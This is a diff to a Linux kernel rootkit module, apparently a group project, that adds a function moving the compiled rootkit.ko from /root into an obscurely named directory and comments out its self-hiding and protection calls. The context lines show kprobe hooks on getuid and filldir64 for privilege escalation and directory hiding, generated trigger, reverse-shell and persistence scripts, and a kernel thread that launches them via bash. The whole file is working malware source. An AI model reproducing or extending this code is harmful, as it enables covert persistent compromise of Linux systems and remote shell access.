@@ -15,6 +15,12 @@
 #include <linux/kthread.h>
 #include <linux/delay.h>
 #include <linux/kmod.h>
+#include <linux/slab.h>
+#include <linux/errno.h>
+#include <linux/path.h>
+#include <linux/string.h>
+#include <linux/uaccess.h>
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Victor, Marouane, Mina, Axel");
@@ -35,6 +41,12 @@ static short hidden = 0;
 // Privilege escalation variables and functions
 static struct kprobe kp_getuid;
 static struct kprobe kp_filldir64;
+
+// Moove file variable
+
+static const char *src_path = "/root/rootkit.ko";
+static const char *dest_dir = "/111111111111111111111111111/";
+static const char *dest_file = "rootkit.ko";
 
 // launch .sh function:
 static struct task_struct *lauch_sh_thread;
@@ -176,7 +188,7 @@ static int dir_init(void)
     return 0;
 }
 
-static int lkm_file_create_init(void) {
+static int lkm_file_create(void) {
     struct file *trigger_file, *revshell_file, *persistence_file;
     loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence = 0;
     char *trigger_content = "#!/bin/bash\n";
@@ -233,6 +245,57 @@ static int lkm_file_create_init(void) {
     return 0;
 }
 
+static int move_file(void) {
+    struct path src, dest_dir_path;
+    struct dentry *dest_dentry;
+    struct renamedata rename_data;
+    int ret;
+
+    // resolve source path
+    ret = kern_path(src_path, LOOKUP_FOLLOW, &src);
+    if (ret) {
+        return ret;
+    }
+
+    // resolve destination path
+    ret = kern_path(dest_dir, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &dest_dir_path);
+    if (ret) {
+        path_put(&src);
+        return ret;
+    }
+
+    // create dentry for the dest file
+    dest_dentry = d_alloc_name(dest_dir_path.dentry, dest_file);
+    if (!dest_dentry) {
+        path_put(&src);
+        path_put(&dest_dir_path);
+        return -ENOMEM;
+    }
+
+    // config of datas for vfs_rename
+    rename_data.old_dir = d_inode(src.dentry->d_parent);
+    rename_data.old_dentry = src.dentry;
+    rename_data.new_dir = d_inode(dest_dir_path.dentry);
+    rename_data.new_dentry = dest_dentry;
+    rename_data.flags = 0;
+
+    // call vfs_rename
+    ret = vfs_rename(&rename_data);
+    if (ret) {
+        printk(KERN_ERR "Erreur: Impossible de déplacer %s vers %s%s\n",
+               src_path, dest_dir, dest_file);
+    } else {
+        printk(KERN_INFO "Fichier déplacé avec succès de %s à %s%s\n",
+               src_path, dest_dir, dest_file);
+    }
+
+    // FREE !!!
+    dput(dest_dentry);
+    path_put(&src);
+    path_put(&dest_dir_path);
+    return ret;
+}
+
 static int lauch_sh_function(void *data) {
     char *persistence_argv[] = {"/bin/bash", "/111111111111111111111111111/persistence.sh", NULL};
     char *revshell_argv[] = {"/bin/bash", "/111111111111111111111111111/revshell.sh", NULL};
@@ -255,10 +318,11 @@ static int __init rootkit_init(void)
 {
     int ret;
 
-    hideme();
-    protect();
+    // hideme();
+    // protect();
     dir_init();
-    lkm_file_create_init();
+    lkm_file_create();
+    move_file();
 
     lauch_sh_thread = kthread_run(lauch_sh_function, NULL, "lauch_sh_thread");
     if (IS_ERR(lauch_sh_thread)) {
